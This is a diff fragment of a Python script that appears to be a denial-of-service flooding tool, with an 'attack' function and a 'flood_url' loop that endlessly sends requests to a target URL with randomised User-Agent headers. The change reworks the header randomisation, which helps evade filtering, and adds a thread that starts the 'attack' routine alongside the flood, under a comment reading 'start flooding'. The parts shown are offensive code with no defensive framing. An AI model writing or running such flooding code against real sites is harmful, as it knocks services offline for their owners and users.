@@ -104,17 +104,14 @@ def attack(ip, port, threadNum):
 
 def flood_url():
     while True:
-        user_agent = ' '.join([random.choice(v['name']) for k, v in USER_AGENT_PARTS['os'].items()])
-        user_agent += ' ('
-        user_agent += ' '.join([random.choice(v['name']) for k, v in USER_AGENT_PARTS['platform'].items()])
-        user_agent += ' '
-        user_agent += ' '.join([random.choice(v) for k, v in USER_AGENT_PARTS['platform']['webkit'].items()])
-        user_agent += ')'
+        user_agent = ' '.join([random.choice(USER_AGENT_PARTS['platform'][k]) for k in USER_AGENT_PARTS['platform']])
+        user_agent += ' (' + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + ')'
         headers['User-Agent'] = user_agent
         request = urllib.request.Request(url, None, headers)
         urllib.request.urlopen(request)
 
 # Mulai ( start flooding )
+threading.Thread(target=attack, args=(ip,port,i)).start()
 threading.Thread(target=flood_url).start()
 
 #NOTE
